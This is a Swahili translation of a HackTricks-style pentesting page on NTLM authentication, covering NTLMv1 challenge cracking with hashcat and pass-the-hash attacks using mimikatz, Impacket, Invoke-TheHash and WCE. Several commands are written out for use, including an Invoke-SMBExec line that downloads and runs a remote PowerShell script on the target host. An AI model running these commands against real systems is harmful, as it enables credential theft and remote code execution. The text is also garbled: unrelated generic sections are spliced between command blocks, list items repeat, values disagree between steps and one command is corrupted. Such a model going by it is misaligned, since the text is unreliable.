# NTLM

## NTLM

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### Taarifa Msingi

Katika mazingira ambapo **Windows XP na Server 2003** yanatumika, hash za LM (Lan Manager) hutumiwa, ingawa inatambulika sana kuwa zinaweza kudukuliwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haikutumika, ikionyesha hash kwa neno tupu.

Kwa chaguo-msingi, itifaki ya uwakilishi wa **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) inachukua nafasi katika hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa kikoa, kushindwa kwa Kerberos kutokana na usanidi usio sahihi, au wakati uhusiano unajaribiwa kutumia anwani ya IP badala ya jina la mwenyeji halali.

Kuwepo kwa kichwa cha **"NTLMSSP"** katika pakiti za mtandao kunamaanisha mchakato wa uwakilishi wa NTLM.

Msaada kwa itifaki za uwakilishi - LM, NTLMv1, na NTLMv2 - unawezeshwa na DLL maalum iliyo katika `%windir%\Windows\System32\msv1\_0.dll`.

**Muhimu**:

* Hash za LM ni hafifu na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) inaonyesha kutokuwepo kwake.
* Kerberos ndiyo njia ya uwakilishi ya chaguo-msingi, na NTLM hutumiwa tu katika hali fulani.
* Pakiti za uwakilishi wa NTLM zinaweza kutambuliwa kwa kichwa cha "NTLMSSP".
* Itifaki za LM, NTLMv1, na NTLMv2 zinasaidiwa na faili ya mfumo `msv1\_0.dll`.

### LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kusanidi itifaki gani itatumika:

#### GUI

Tekeleza _secpol.msc_ -> Sera za ndani -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uwakilishi wa LAN Manager. Kuna viwango 6 (kutoka 0 hadi 5).

![](<../../.gitbook/assets/image (92).png>)

#### Usajili

Hii itaweka kiwango cha 5:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

Inawezekana kuwa na thamani zifuatazo:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

### Mpangilio wa msingi wa uthibitishaji wa NTLM wa Domain

1. **Mtumiaji** anaingiza **vitambulisho** vyake
2. Mashine ya mteja inatuma ombi la uthibitishaji likituma **jina la kikoa** na **jina la mtumiaji**
3. **Seva** inatuma **changamoto**
4. Mteja anaficha **changamoto** kwa kutumia hash ya nenosiri kama ufunguo na kuituma kama jibu
5. **Seva inatuma** kwa **Mfumo wa Udhibiti wa Kikoa** jina la kikoa, jina la mtumiaji, changamoto, na jibu. Ikiwa hakuna Mwongozo wa Shughuli uliowekwa au jina la kikoa ni jina la seva, vitambulisho vinakaguliwa **kwa kiwango cha ndani**.
6. **Mfumo wa Udhibiti wa Kikoa** unakagua ikiwa kila kitu ni sahihi na kutuma habari kwa seva

**Seva** na **Mfumo wa Udhibiti wa Kikoa** wanaweza kuunda **Channel Salama** kupitia seva ya **Netlogon** kwani Mfumo wa Udhibiti wa Kikoa anajua nenosiri la seva (lipo ndani ya db ya **NTDS.DIT**).

#### Mpangilio wa uthibitishaji wa NTLM wa ndani

Uthibitishaji ni kama ule uliotajwa **hapo awali lakini** **seva** inajua **hash ya mtumiaji** anayejaribu kuthibitisha ndani ya faili ya **SAM**. Kwa hivyo, badala ya kuuliza Mfumo wa Udhibiti wa Kikoa, **seva itajikagua yenyewe** ikiwa mtumiaji anaweza kuthibitisha.

#### Changamoto ya NTLMv1

Urefu wa **changamoto ni herufi 8** na **jibu ni urefu wa herufi 24**.

**Hash NT (herufi 16)** imegawanywa katika **sehemu 3 za herufi 7 kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho imejazwa na sifuri**. Kisha, **changamoto** inafichwa tofauti na kila sehemu na **herufi zilizofichwa** zinajumuishwa. Jumla: 8B + 8B + 8B = 24 Herufi.

**Matatizo**:

* Ukosefu wa **ubunifu**
* Sehemu 3 zinaweza **kushambuliwa kwa kujitegemea** ili kupata hash ya NT
* **DES inaweza kuvunjwa**
* Ufunguo wa 3º unajumuisha **sifuri tano**.
* Kwa kutumia **changamoto ile ile**, **jibu** litakuwa **sawa**. Kwa hivyo, unaweza kumpa mhanga herufi "**1122334455667788**" kama **changamoto** na kushambulia jibu lililotumiwa kwa kutumia **meza za upinde zilizopangwa mapema**.

#### Shambulio la NTLMv1

Siku hizi ni nadra kupata mazingira yaliyowekwa kwa Unconstrained Delegation, lakini hii haimaanishi kuwa huwezi **kutumia huduma ya Print Spooler** iliyowekwa.

Unaweza kutumia vibali/vikao fulani ulivyonavyo kwenye AD kuomba **printa kuthibitisha** dhidi ya **mwenyeji chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder` unaweza **kuweka changamoto ya uthibitishaji kuwa 1122334455667788**, kukamata jaribio la uthibitishaji, na ikiwa ilifanywa kwa kutumia **NTLMv1** utaweza **kulivunja**.\
Ikiwa unatumia `responder` unaweza kujaribu **kutumia bendera `--lm`** kujaribu **kudhibiti** **uthibitishaji**.\
_Tafadhali kumbuka kuwa kwa mbinu hii uthibitishaji lazima ufanyike kwa kutumia NTLMv1 (NTLMv2 sio halali)._

Kumbuka kuwa printa itatumia akaunti ya kompyuta wakati wa uthibitishaji, na akaunti za kompyuta hutumia **nenosiri ndefu na la kubahatisha** ambalo **labda hautaweza kulivunja** kwa kutumia **kamusi za kawaida**. Lakini uthibitishaji wa **NTLMv1** hutumia DES ([taarifa zaidi hapa](./#ntlmv1-challenge)), kwa hivyo kwa kutumia huduma fulani zilizotengwa maalum kwa kuvunja DES utaweza kulivunja (unaweza kutumia [https://crack.sh/](https://crack.sh) kwa mfano).

#### Shambulio la NTLMv1 na hashcat

NTLMv1 pia inaweza kuvunjwa na Chombo cha NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ambacho hutoa muundo wa ujumbe wa NTLMv1 ambao unaweza kuvunjwa na hashcat.

Amri ya

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

## NTLM

NTLM (NT LAN Manager) ni itifaki ya uwakilishi wa kitambulisho inayotumiwa katika mifumo ya Windows. Inatumika kwa kusudi la uwakilishi wa kitambulisho na uthibitishaji wa watumiaji katika mazingira ya mtandao.

### Utangulizi

NTLM inafanya kazi kwa kutumia hatua tatu za msingi:

1. Utambulisho wa awali: Mteja hutuma ombi la utambulisho kwa seva.
2. Utambulisho wa kati: Seva hutuma changamoto kwa mteja, ambayo inajumuisha kamba ya nasibu.
3. Utambulisho wa mwisho: Mteja hutuma jibu lenye kamba ya nasibu iliyohifadhiwa kwenye kompyuta yake.

### Ukiukaji wa NTLM

Kuna njia kadhaa za kukiuka usalama wa NTLM, ikiwa ni pamoja na:

* **Pass-the-Hash**: Mbinu ambapo mshambuliaji hutumia hash ya nenosiri badala ya nenosiri lenyewe kwa kuingia kwenye mfumo.
* **Pass-the-Ticket**: Mshambuliaji hutumia tiketi ya uthibitisho iliyopatikana kutoka kwa mteja mwingine kuingia kwenye mfumo.
* **Overpass-the-Hash**: Mshambuliaji hutumia hash ya nenosiri iliyopatikana kutoka kwa mteja mwingine kufanya vitendo vya usimamizi kwenye mfumo.
* **Reflection**: Mshambuliaji hutumia mbinu ya kurejea ili kudanganya mteja kutoa hash ya nenosiri.

### Kuzuia NTLM

Kuna hatua kadhaa za kuchukua ili kuzuia ukiukaji wa NTLM:

1. **Kuondoa msaada wa NTLM**: Funga msaada wa NTLM kwenye seva na vifaa vingine vya mtandao.
2. **Tumia itifaki zinazofaa**: Badilisha kutoka NTLM kwenda itifaki zingine zinazofaa kama vile Kerberos.
3. **Tumia sera kali za nenosiri**: Weka sera kali za nenosiri ili kuhakikisha kuwa nenosiri ni ngumu na linabadilishwa mara kwa mara.
4. **Tumia ufungaji wa kikoa**: Tumia ufungaji wa kikoa ili kudhibiti ufikiaji na kusimamia kitambulisho cha watumiaji.

### Marejeo

* [https://en.wikipedia.org/wiki/NT\_LAN\_Manager](https://en.wikipedia.org/wiki/NT\_LAN\_Manager)

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

## HATUA YA KUANZA

Ili kuanza kufanya kazi na NTLM, unahitaji kufuata hatua zifuatazo:

1. **Kutambua Lengo**: Anza kwa kutambua mfumo unaotaka kushambulia na kuelewa jinsi NTLM inavyotumiwa katika mazingira hayo.
2. **Kukusanya Habari**: Jifunze kuhusu mazingira ya lengo lako, ikiwa ni pamoja na aina ya NTLM inayotumiwa, mipangilio ya usalama, na maelezo mengine muhimu.
3. **Kutambua Mbinu za Shambulio**: Elewa mbinu za kawaida za shambulio zinazohusiana na NTLM, kama vile Pass-the-Hash, Pass-the-Ticket, na NTLM Relay.
4. **Kukusanya Nyenzo za Shambulio**: Pata zana na rasilimali zinazohitajika kutekeleza mbinu za shambulio za NTLM.
5. **Kutekeleza Shambulio**: Fanya shambulio kwa kutumia mbinu zilizopatikana na nyenzo zilizokusanywa hapo awali.
6. **Kupima Mafanikio**: Angalia ikiwa shambulio lako limefanikiwa na ikiwa unaweza kupata ufikiaji usiohalali kwenye mfumo wa lengo.
7. **Kuchukua Hatua za Kukinga**: Tumia hatua za kuzuia ili kuzuia shambulio la NTLM na kuimarisha usalama wa mfumo wako.
8. **Kujifunza na Kuboresha**: Endelea kujifunza na kuboresha ujuzi wako wa NTLM na mbinu zinazohusiana na shambulio.

Kwa kufuata hatua hizi, utakuwa na uwezo wa kufanya kazi na NTLM na kutekeleza mbinu za shambulio kwa ufanisi. Kumbuka kuwa matumizi ya NTLM kwa madhumuni ya shambulio yanapaswa kufanywa tu kwa idhini ya kisheria na kwa madhumuni ya kujifunza na kuboresha usalama wa mifumo yako.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

Chalaza hashcat (ugawanyaji bora ni kupitia kifaa kama hashtopolis) kwani itachukua siku kadhaa vinginevyo.

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

Katika kesi hii tunajua kuwa nenosiri ni password hivyo tutafanya udanganyifu kwa madhumuni ya demo:

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

Sasa tunahitaji kutumia zana za hashcat-utilities ili kubadilisha funguo za des zilizovunjwa kuwa sehemu za hash ya NTLM:

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

Hatua ya mwisho ni kuhakikisha kuwa sera za kikoa zimeimarishwa kwa usalama wa NTLM. Hapa kuna hatua kadhaa unazoweza kuchukua:

1. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Incoming NTLM Traffic" kwa kuiweka kuwa "Deny All" au "Deny All Accounts". Hii itazuia trafiki ya NTLM kuingia kwenye mtandao wako.
2. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Outgoing NTLM Traffic to Remote Servers" kwa kuiweka kuwa "Deny All" au "Deny All Accounts". Hii itazuia trafiki ya NTLM kutoka kwa watumiaji wako kwenda kwenye seva za mbali.
3. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Incoming NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayoingia kwenye mtandao wako.
4. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Outgoing NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayotoka kwa watumiaji wako.
5. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Incoming NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayoingia kwenye mtandao wako.
6. Wezesha Sera ya Kikoa ya "Network Security: Restrict NTLM: Audit Outgoing NTLM Traffic" kwa kuiweka kuwa "Enable auditing for all accounts". Hii itawezesha ufuatiliaji wa trafiki ya NTLM inayotoka kwa watumiaji wako.
7. Hakikisha kuwa sera hizi zimeenea kwa vikoa vyote katika mfumo wako wa uendeshaji.

Kwa kufuata hatua hizi, utaimarisha usalama wa NTLM kwenye mfumo wako wa uendeshaji na kupunguza hatari ya mashambulizi yanayohusiana na NTLM.

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

## NTLM

NTLM (NT LAN Manager) ni itifaki ya uwakilishi wa kitambulisho inayotumiwa katika mifumo ya Windows kwa madhumuni ya uwakilishi wa kitambulisho na uthibitishaji. Itifaki hii hutumiwa sana katika mazingira ya mitandao ya ndani ya Windows.

### Utangulizi

NTLM inatumia mbinu ya kuchakata nyuma (challenge-response) kwa uthibitishaji wa watumiaji. Mchakato huu unajumuisha hatua tatu:

1. **Uthibitishaji wa awali (Negotiation)**: Mteja na seva hufanya mazungumzo ya awali ili kubadilishana maelezo ya uthibitishaji na kuanzisha mazingira ya uthibitishaji.
2. **Uthibitishaji wa changamoto (Challenge-Response)**: Seva hutuma changamoto kwa mteja, ambayo mteja hujibu kwa kutumia hash ya nenosiri lake.
3. **Uthibitishaji wa mwisho (Session Security)**: Mara baada ya mteja kuthibitishwa, seva na mteja huanzisha kikao salama cha mawasiliano.

### Mashambulizi ya NTLM

NTLM ina hatari kadhaa za usalama ambazo zinaweza kuch exploited na wadukuzi. Baadhi ya mashambulizi maarufu ni pamoja na:

* **Pass-the-Hash**: Mshambuliaji anaweza kutumia hash ya nenosiri la mtumiaji iliyopatikana hapo awali kuingia kwenye mfumo.
* **Pass-the-Ticket**: Mshambuliaji anaweza kutumia tiketi ya uthibitishaji iliyopatikana hapo awali kuingia kwenye mfumo.
* **Relay Attack**: Mshambuliaji anaweza kuchukua maelezo ya uthibitishaji kutoka kwa mteja na kuyatumia kuingia kwenye seva nyingine.

### Kuhifadhi NTLM

Kwa sababu ya hatari za usalama zinazohusiana na NTLM, ni muhimu kuchukua hatua za kuhifadhi ili kuzuia mashambulizi. Hatua za kuhifadhi zinaweza kujumuisha:

* **Kuondoa NTLM**: Kuzima kabisa matumizi ya NTLM kwenye mifumo yako.
* **Kuwezesha SMB Signing**: Kuhakikisha kuwa mawasiliano ya SMB yanasainiwa ili kuzuia mashambulizi ya kati.
* **Kuwezesha LDAP Signing**: Kuhakikisha kuwa mawasiliano ya LDAP yanasainiwa ili kuzuia mashambulizi ya kati.
* **Kuwezesha Extended Protection for Authentication**: Kuhakikisha kuwa mawasiliano ya NTLM yanalindwa na ulinzi wa ziada.

### Hitimisho

Kuelewa NTLM na hatari zake za usalama ni muhimu kwa wataalamu wa usalama wa mifumo ya Windows. Kwa kuchukua hatua za kuhifadhi zinazofaa, tunaweza kuzuia mashambulizi yanayotokana na NTLM na kudumisha usalama wa mifumo yetu.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

#### NTLMv2 Challenge

**Urefu wa changamoto ni herufi 8** na **majibu 2 yanatumwa**: Moja ni urefu wa **herufi 24** na urefu wa **lingine** ni **kubadilika**.

**Jibu la kwanza** linatengenezwa kwa kuchifra kwa kutumia **HMAC\_MD5** **herufi** iliyoundwa na **mteja na kikoa** na kutumia kama **funguo** **hash MD4** ya **hash NT**. Kisha, **matokeo** yatatumiwa kama **funguo** kuchifra kwa kutumia **HMAC\_MD5** **changamoto**. Kwa hili, **changamoto ya mteja ya herufi 8 itaongezwa**. Jumla: 24 B.

**Jibu la pili** linatengenezwa kwa kutumia **thamani kadhaa** (changamoto mpya ya mteja, **muda** ili kuepuka **mashambulizi ya kurudia**...)

Ikiwa una **pcap ambayo imekamata mchakato wa uwakilishi wa uthibitishaji uliofanikiwa**, unaweza kufuata mwongozo huu kupata kikoa, jina la mtumiaji, changamoto na jibu na jaribu kuvunja nywila: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

### Pita Hash

**Marafiki unapokuwa na hash ya mwathirika**, unaweza kuitumia kuwa **kama yeye**.\
Unahitaji kutumia **zana** ambayo itatekeleza **uthibitishaji wa NTLM** kwa kutumia **hash hiyo**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** hash hiyo ndani ya **LSASS**, kwa hivyo wakati wowote **uthibitishaji wa NTLM unatekelezwa**, hash hiyo itatumika. Chaguo la mwisho ndilo linalofanywa na mimikatz.

**Tafadhali, kumbuka kuwa unaweza kutekeleza mashambulizi ya Pita Hash pia kwa kutumia akaunti za Kompyuta.**

#### **Mimikatz**

**Inahitaji kukimbia kama msimamizi**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

Hii itazindua mchakato ambao utamilikiwa na watumiaji ambao wamezindua mimikatz lakini ndani ya LSASS, nywila zilizohifadhiwa ni zile zilizo ndani ya vigezo vya mimikatz. Kisha, unaweza kupata rasilimali za mtandao kana kwamba wewe ni mtumiaji huyo (sawa na mbinu ya `runas /netonly` lakini hauitaji kujua nywila ya maandishi wazi).

#### Pass-the-Hash kutoka kwenye linux

Unaweza kupata utekelezaji wa nambari kwenye mashine za Windows ukitumia Pass-the-Hash kutoka kwenye Linux.\
[**Bofya hapa kujifunza jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/sw/windows/ntlm/broken-reference/README.md)

#### Zana zilizopangwa za Impacket Windows

Unaweza kupakua [zana za impacket kwa Windows hapa](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Katika kesi hii unahitaji kutoa amri, cmd.exe na powershell.exe sio halali kupata kabati la kuingiliana)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Kuna zana zingine za Impacket...

#### Invoke-TheHash

Unaweza kupata hati za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

**Invoke-SMBExec**

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Kuita-WMIExec**

`Invoke-WMIExec` ni skripti ya PowerShell ambayo inatumika kutekeleza amri kwenye mfumo wa mbali kupitia WMI (Windows Management Instrumentation). Skripti hii inaruhusu mtumiaji kutekeleza amri za PowerShell kwenye mfumo wa lengo bila kuhitaji uwepo wa seva ya SMB.

**Matumizi**

```plaintext
Invoke-WMIExec -Target <target> [-Username <username>] [-Password <password>] [-Command <command>] [-Verbose]
```

**Vigezo**

* `-Target`: Anwani ya IP au jina la uwanja la mfumo wa lengo.
* `-Username`: Jina la mtumiaji wa akaunti ya kuingia kwenye mfumo wa lengo (hiari).
* `-Password`: Nenosiri la akaunti ya kuingia kwenye mfumo wa lengo (hiari).
* `-Command`: Amri ya PowerShell ya kutekelezwa kwenye mfumo wa lengo (hiari).
* `-Verbose`: Onyesha maelezo zaidi wakati wa utekelezaji (hiari).

**Maelezo**

`Invoke-WMIExec` inatumia WMI kuanzisha uhusiano na mfumo wa lengo na kutekeleza amri za PowerShell kwa kutumia `Win32_Process` na `Create` method. Skripti hii inaweza kutumika kwa ufanisi katika mazingira ambapo seva ya SMB imezimwa au haipatikani.

**Vidokezo**

* Ili kutumia `Invoke-WMIExec`, unahitaji kuwa na idhini ya kuingia kwenye mfumo wa lengo.
* Kama jina la mtumiaji na nenosiri havijatolewa, skripti itatumia maelezo ya kuingia ya mtumiaji wa sasa.
* Ikiwa amri haijatolewa, skripti itatekeleza amri ya msingi ya `whoami` kwenye mfumo wa lengo.
* Kwa matokeo bora, hakikisha kuwa mfumo wa lengo una mazingira sahihi ya WMI na idhini zinazofaa.

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Kuita-SMBClient**

`Invoke-SMBClient` ni kipengele cha PowerShell kinachotumiwa kuingia kwenye mfumo wa SMB (Server Message Block) na kutekeleza operesheni mbalimbali kama vile kusoma, kuandika, na kufuta faili. Kwa kutumia kipengele hiki, unaweza kufanya uchunguzi wa kina wa mifumo ya SMB na kuchunguza udhaifu wowote uliopo.

Kipengele hiki kinaweza kutumiwa kwa njia mbalimbali, kama vile kuingia kwenye mfumo wa SMB kwa kutumia jina la mtumiaji na nenosiri, kuingia kwa kutumia cheti cha kuingilia, au hata kuingia kwa kutumia kitambulisho cha NTLM (New Technology LAN Manager).

Kwa kuita `Invoke-SMBClient`, unaweza kufanya uchunguzi wa mifumo ya SMB na kuchunguza udhaifu wowote uliopo. Kumbuka kuwa matumizi ya kipengele hiki yanapaswa kufanywa kwa njia halali na kwa idhini ya mmiliki wa mfumo husika.

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

**Kuita-SMBEnum**

`Invoke-SMBEnum` ni skripti ya PowerShell ambayo inatumika kuchunguza na kuchambua mazingira ya SMB (Server Message Block) kwenye mfumo wa Windows. Skripti hii inatoa habari muhimu kuhusu mazingira ya SMB, kama vile orodha ya watumiaji, orodha ya kikundi, na maelezo mengine ya kifaa.

Skripti hii inaweza kutumiwa kama zana ya uchunguzi wa usalama au kwa madhumuni ya uchunguzi wa ndani. Inatoa ufikiaji wa habari muhimu ambazo zinaweza kutumiwa kwa uchambuzi wa hatari au kuboresha usalama wa mazingira ya SMB.

Kwa kuita `Invoke-SMBEnum`, unaweza kupata habari muhimu kuhusu mazingira ya SMB na kuchambua hatari za usalama ambazo zinaweza kuwepo. Skripti hii inaweza kuwa na manufaa kwa wataalamu wa usalama, wataalamu wa uchunguzi wa ndani, au wale wanaofanya upimaji wa usalama.

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

**Kuita-TheHash**

Kazi hii ni **mchanganyiko wa zingine zote**. Unaweza kuwasilisha **watumishi kadhaa**, **kutoa kipaumbele** kwa wengine na **kuchagua** **chaguo** unayotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ikiwa unachagua **yoyote** kati ya **SMBExec** na **WMIExec** lakini **hutoi** kipengele cha _**Amri**_, itaangalia tu ikiwa una **mamlaka ya kutosha**.

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

#### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

#### Mhariri wa Vitambulisho vya Windows (WCE)

**Inahitaji kukimbia kama msimamizi**

Zana hii itafanya kitu kimoja na mimikatz (kurekebisha kumbukumbu ya LSASS).

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

#### Utekelezaji wa mbali wa Windows kwa kutumia jina la mtumiaji na nenosiri

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

### Kupata siri kutoka kwenye Kifaa cha Windows

**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata siri kutoka kwenye kifaa cha Windows unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/sw/windows-hardening/ntlm/broken-reference/README.md)**.**

### NTLM Relay na Responder

**Soma mwongozo maelezo zaidi kuhusu jinsi ya kufanya mashambulizi haya hapa:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### Kuchambua changamoto za NTLM kutoka kwenye kifaa cha mtandao

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**]\(https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
